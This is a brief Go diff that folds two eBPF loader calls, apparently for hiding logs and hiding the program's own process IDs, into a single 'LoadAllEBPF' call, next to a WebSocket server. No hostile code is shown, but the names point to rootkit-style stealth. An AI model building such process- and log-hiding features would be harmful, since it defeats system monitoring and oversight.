@@ -46,17 +46,11 @@ func main() {
 		core.SetupWebSocketServer(bridge)
 	}()
 
-	exit, err := ebpf.LoadAndAttachHideLog()
+	links, err := ebpf.LoadAllEBPF()
 	if err != nil {
 		log.Fatal(err)
 	}
-	defer ebpf.CloseLinks(exit)
-
-	enter, exit, err := ebpf.HideOwnPIDs()
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer ebpf.CloseLinks(enter, exit)
+	defer ebpf.CloseLinks(links...)
 
 	<-c
 }
